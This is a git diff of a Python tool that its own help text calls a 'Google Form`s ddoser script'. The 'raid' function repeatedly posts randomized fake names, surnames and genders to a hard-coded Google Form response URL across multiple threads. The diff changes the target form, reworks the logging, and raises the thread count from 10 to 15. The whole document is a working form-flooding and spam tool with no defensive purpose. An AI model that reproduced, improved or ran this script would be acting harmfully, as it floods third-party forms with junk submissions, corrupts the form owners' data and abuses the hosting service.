@@ -35,7 +35,7 @@ headers = {
 
 random_num = [1, 5]
 
-_link = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSc9CFL6d7qKMJUzKl-FUGWONREe6y9PygPzDIVkeDSyU4-bpg/formResponse'
+_link = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLScJ4AE0VbNADcHOU4X1D8O417IwI1hr-eqJA0oOF3RNKGhdSg/formResponse'
 
 jojo = random.choice(random_num)
 
@@ -180,8 +180,8 @@ def RaidComporator(ServerList, arg):
                         res[i['id']] = SpamModules.Genders("помянем")
                     elif l['value'] == 'name':
                         res[i['id']] = Identities.random_names("да")
-                    elif l['value'] == 'surname': 
-                        res[i['id']] = Identities.random_surnames("поработай на работе")
+                    elif l['value'] == "surname":
+                        res[i['id']] = Identities.random_surnames("стартуем")
                     else:                               
                         res[i['id']] = l['value']
         else:
@@ -224,6 +224,8 @@ def AnsSetter():
 def raid(e:int):
         
     RaidReqList, i = RaidComporator(jojo, 1), 0
+    
+    print(RaidReqList)
                     
     r = requests.post(_link, 
                         data = RaidReqList,
@@ -232,7 +234,8 @@ def raid(e:int):
                 
     if r.status_code == 200:
         status = "OK"
-        LogManager.info(f"{r} === {e + 1} || {i + 1} === {status}")
+        res = f"{r} === {e + 1} || {i + 1}     {status}".rjust(35, "<")
+        LogManager.info(res)
         
         for i in range(249):
             RaidReqList = RaidComporator(jojo, 1)
@@ -244,17 +247,21 @@ def raid(e:int):
         
             if r.status_code == 200:
                 status = "OK"
-                LogManager.info(f"{r} === {e + 1} || {i + 1} === {status}")
+                res = f"{r} === {e + 1} || {i + 1}     {status}".rjust(35, "<")
+                LogManager.info(res)
             elif r.status_code == 405 or r.status_code == 404 or r.status_code == 429 or r.status_code == 400:
                 status = responses[r.status_code]
-                LogManager.warning(f"{r} === {e + 1} || {i + 1} === {status}")
+                res = f"{r} === {e + 1} || {i + 1}     {status}".rjust(35, "<")
+                LogManager.warning(res)
             else:
                 status = responses[r.status_code]
-                LogManager.error(f"{r} === {e + 1} || {i + 1} === {status}")
+                res = f"{r} === {e + 1} || {i + 1}     {status}".rjust(35, "<")
+                LogManager.error(res)
         
     elif r.status_code == 405 or r.status_code == 404 or r.status_code == 429:
         status = responses[r.status_code]
-        LogManager.warning(f"{r} === {e + 1} || {i + 1} === {status}")
+        res = f"{r} === {e + 1} || {i + 1}     {status}".rjust(35, "<")
+        LogManager.info(res)
     elif r.status_code == 400:
         for i in range(249):
             RaidReqList = RaidComporator(jojo, 0)
@@ -266,17 +273,21 @@ def raid(e:int):
             
             if r.status_code == 200:
                 status = "OK"
-                LogManager.info(f"{r} === {e + 1} || {i + 1} === {status}")
+                res = f"{r} === {e + 1} || {i + 1}     {status}".rjust(35, "<")
+                LogManager.info(res)
             elif r.status_code == 405 or r.status_code == 404 or r.status_code == 429 or r.status_code == 400:
                 status = responses[r.status_code]
-                LogManager.warning(f"{r} === {e + 1} || {i + 1} === {status}")
+                res = f"{r} === {e + 1} || {i + 1}     {status}".rjust(35, "<")
+                LogManager.info(res)
             else:
                 status = responses[r.status_code]
-                LogManager.error(f"{r} === {e + 1} || {i + 1} === {status}")
+                res = f"{r} === {e + 1} || {i + 1}     {status}".rjust(35, "<")
+                LogManager.info(res)
             
     else:
         status = responses[r.status_code]
-        LogManager.error(f"{r} === {e + 1} || {i + 1} === {status}")
+        res = f"{r} === {e + 1} || {i + 1}     {status}".rjust(35, "<")
+        LogManager.info(res)
 
 @click.command()
 @click.option('--link', default = True, help = 'Show raiding link')
@@ -289,80 +300,80 @@ def starter(link, resp, raid, log, test, _input):
     
     """Google Form`s ddoser script`s help`s command:\\//"""
     
-    # try:
-    if link == "get":
-        print("______  __    ______        \n___  / / /_______  /_______\n__  /_/ /_  _ \_  /___  __ \"\n_  __  / /  __/  / __  /_/ /\n/_/ /_/  \___//_/  _  .___/ \n                   /_/      \n")
-        print(str(BeautifulSoup(requests.get(_link).text, "lxml").title).replace("title", '').replace("<", '').replace(">", '').replace("/", "") + ' :')
-        print(_link)
-    if link == "set":
-        print("______  __    ______        \n___  / / /_______  /_______\n__  /_/ /_  _ \_  /___  __ \"\n_  __  / /  __/  / __  /_/ /\n/_/ /_/  \___//_/  _  .___/ \n                   /_/      \n")
-        SetLink(input(" Enter new raid link: "))
+    try:
+        if link == "get":
+            print("______  __    ______        \n___  / / /_______  /_______\n__  /_/ /_  _ \_  /___  __ \"\n_  __  / /  __/  / __  /_/ /\n/_/ /_/  \___//_/  _  .___/ \n                   /_/      \n")
+            print(str(BeautifulSoup(requests.get(_link).text, "lxml").title).replace("title", '').replace("<", '').replace(">", '').replace("/", "") + ' :')
+            print(_link)
+        if link == "set":
+            print("______  __    ______        \n___  / / /_______  /_______\n__  /_/ /_  _ \_  /___  __ \"\n_  __  / /  __/  / __  /_/ /\n/_/ /_/  \___//_/  _  .___/ \n                   /_/      \n")
+            SetLink(input(" Enter new raid link: "))
 
-    if resp == "headers":
-        Response("headers")                             
-    if resp == "content":
-        Response("content")
-    if "content" in resp and len(resp) != 7:
-        Response("content", resp[7:])
-    if "headers" in resp and len(resp) != 7:
-        Response("headers", resp[7:])
-    if "status" in resp and len(resp) != 6:
-        StatusCode(resp[6:])
-    if "set_input" in resp and len(resp) != 9:
-        SetInput(resp[10:])
-    if resp == "get_input":                                 
-        GetInput()
-    if resp == "set_input":
-        SetInput(_link);
-    if resp == "status":
-        StatusCode()
-    if log == "cls":
-        with open("LogPython_info.log", "w") as log_file:
-            log_file.write(" ")
+        if resp == "headers":
+            Response("headers")                             
+        if resp == "content":
+            Response("content")
+        if "content" in resp and len(resp) != 7:
+            Response("content", resp[7:])
+        if "headers" in resp and len(resp) != 7:
+            Response("headers", resp[7:])
+        if "status" in resp and len(resp) != 6:
+            StatusCode(resp[6:])
+        if "set_input" in resp and len(resp) != 9:
+            SetInput(resp[10:])
+        if resp == "get_input":                                 
+            GetInput()
+        if resp == "set_input":
+            SetInput(_link);
+        if resp == "status":
+            StatusCode()
+        if log == "cls":
+            with open("LogPython_info.log", "w") as log_file:
+                log_file.write(" ")
 
-        LogManager.info("Cleaning complete [+]")
-    if log == "get":
-        for i in LogManager.get_logs(int(input("Enter quantity of logs: ")))[0]:
-            print(i, end ="")
-    if _input == "set":
-        AnsSetter()
-    if test == "jojo":
-        LongChecker()
-    if raid == 1:
+            LogManager.info("Cleaning complete [+]")
+        if log == "get":
+            for i in LogManager.get_logs(int(input("Enter quantity of logs: ")))[0]:
+                print(i, end ="")
+        if _input == "set":
+            AnsSetter()
+        if test == "jojo":
+            LongChecker()
+        if raid == 1:
 
-        print('\033[36m' + '          _____                    _____                    _____                    _____                    _____                    _____     _____  ')
-        print('         /\    \                  /\    \                  /\    \                  /\    \                  /\    \                  /\    \   /\    \ ')
-        print('        /::\____\                /::\    \                /::\    \                /::\    \                /::\    \                /::\____\ /::\____\'')
-        print('       /:::/    /                \:::\    \              /::::\    \              /::::\    \              /::::\    \              /:::/    //:::/    /')
-        print('      /:::/    /                  \:::\    \            /::::::\    \            /::::::\    \            /::::::\    \            /:::/    //:::/    / ')
-        print('     /:::/    /                    \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/    //:::/    /  ')
-        print('    /:::/____/                      \:::\    \        /:::/  \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/    //:::/    /   ')
-        print('   /::::\    \                      /::::\    \      /:::/    \:::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/    //:::/    /    ')
-        print('  /::::::\    \   _____    ____    /::::::\    \    /:::/    / \:::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/    //:::/    /     ')
-        print(' /:::/\:::\    \ /\    \  /\   \  /:::/\:::\    \  /:::/    /   \:::\ ___\  /:::/\:::\   \:::\ ___\  /:::/\:::\   \:::\    \  /:::/    //:::/    /      ')
-        print('/:::/  \:::\    /::\____\/::\   \/:::/  \:::\____\/:::/____/     \:::|    |/:::/__\:::\   \:::|    |/:::/__\:::\   \:::\____\/:::/____//:::/____/       ')
-        print('\::/    \:::\  /:::/    /\:::\  /:::/    \::/    /\:::\    \     /:::|____|\:::\   \:::\  /:::|____|\:::\   \:::\   \::/    /\:::\    \\:::\    \       ')
-        print(' \/____/ \:::\/:::/    /  \:::\/:::/    / \/____/  \:::\    \   /:::/    /  \:::\   \:::\/:::/    /  \:::\   \:::\   \/____/  \:::\    \\:::\    \      ')
-        print('          \::::::/    /    \::::::/    /            \:::\    \ /:::/    /    \:::\   \::::::/    /    \:::\   \:::\    \       \:::\    \\:::\    \     ')
-        print('           \::::/    /      \::::/____/              \:::\    /:::/    /      \:::\   \::::/    /      \:::\   \:::\____\       \:::\    \\:::\    \    ')
-        print('           /:::/    /        \:::\    \               \:::\  /:::/    /        \:::\  /:::/    /        \:::\   \::/    /        \:::\    \\:::\    \   ')
-        print('          /:::/    /          \:::\    \               \:::\/:::/    /          \:::\/:::/    /          \:::\   \/____/          \:::\    \\:::\    \  ')
-        print('         /:::/    /            \:::\    \               \::::::/    /            \::::::/    /            \:::\    \               \:::\    \\:::\    \ ')
-        print('        /:::/    /              \:::\____\               \::::/    /              \::::/    /              \:::\____\               \:::\____\\:::\____\'')
-        print('        \::/    /                \::/    /                \::/____/                \::/____/                \::/    /                \::/    / \::/    /')
-        print('         \/____/                  \/____/                  ~~                       ~~                       \/____/                  \/____/   \/____/ ')
-        print('                                                                                                                                                        ')
-        
-        start1()
+            print('\033[36m' + '          _____                    _____                    _____                    _____                    _____                    _____     _____  ')
+            print('         /\    \                  /\    \                  /\    \                  /\    \                  /\    \                  /\    \   /\    \ ')
+            print('        /::\____\                /::\    \                /::\    \                /::\    \                /::\    \                /::\____\ /::\____\'')
+            print('       /:::/    /                \:::\    \              /::::\    \              /::::\    \              /::::\    \              /:::/    //:::/    /')
+            print('      /:::/    /                  \:::\    \            /::::::\    \            /::::::\    \            /::::::\    \            /:::/    //:::/    / ')
+            print('     /:::/    /                    \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/    //:::/    /  ')
+            print('    /:::/____/                      \:::\    \        /:::/  \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/    //:::/    /   ')
+            print('   /::::\    \                      /::::\    \      /:::/    \:::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/    //:::/    /    ')
+            print('  /::::::\    \   _____    ____    /::::::\    \    /:::/    / \:::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/    //:::/    /     ')
+            print(' /:::/\:::\    \ /\    \  /\   \  /:::/\:::\    \  /:::/    /   \:::\ ___\  /:::/\:::\   \:::\ ___\  /:::/\:::\   \:::\    \  /:::/    //:::/    /      ')
+            print('/:::/  \:::\    /::\____\/::\   \/:::/  \:::\____\/:::/____/     \:::|    |/:::/__\:::\   \:::|    |/:::/__\:::\   \:::\____\/:::/____//:::/____/       ')
+            print('\::/    \:::\  /:::/    /\:::\  /:::/    \::/    /\:::\    \     /:::|____|\:::\   \:::\  /:::|____|\:::\   \:::\   \::/    /\:::\    \\:::\    \       ')
+            print(' \/____/ \:::\/:::/    /  \:::\/:::/    / \/____/  \:::\    \   /:::/    /  \:::\   \:::\/:::/    /  \:::\   \:::\   \/____/  \:::\    \\:::\    \      ')
+            print('          \::::::/    /    \::::::/    /            \:::\    \ /:::/    /    \:::\   \::::::/    /    \:::\   \:::\    \       \:::\    \\:::\    \     ')
+            print('           \::::/    /      \::::/____/              \:::\    /:::/    /      \:::\   \::::/    /      \:::\   \:::\____\       \:::\    \\:::\    \    ')
+            print('           /:::/    /        \:::\    \               \:::\  /:::/    /        \:::\  /:::/    /        \:::\   \::/    /        \:::\    \\:::\    \   ')
+            print('          /:::/    /          \:::\    \               \:::\/:::/    /          \:::\/:::/    /          \:::\   \/____/          \:::\    \\:::\    \  ')
+            print('         /:::/    /            \:::\    \               \::::::/    /            \::::::/    /            \:::\    \               \:::\    \\:::\    \ ')
+            print('        /:::/    /              \:::\____\               \::::/    /              \::::/    /              \:::\____\               \:::\____\\:::\____\'')
+            print('        \::/    /                \::/    /                \::/____/                \::/____/                \::/    /                \::/    / \::/    /')
+            print('         \/____/                  \/____/                  ~~                       ~~                       \/____/                  \/____/   \/____/ ')
+            print('                                                                                                                                                        ')
+            
+            start1()
                     
-    # except Exception as er:
-        # LogManager.error(er)
+    except Exception as er:
+        LogManager.error(er)
 
 def start1(): 
     i = 123
     _ = list()
     
-    for i in range(10):
+    for i in range(15):
         thr = threading.Thread(target = raid, args = [i], daemon = True)
         thr.start()    
         _.append(thr)
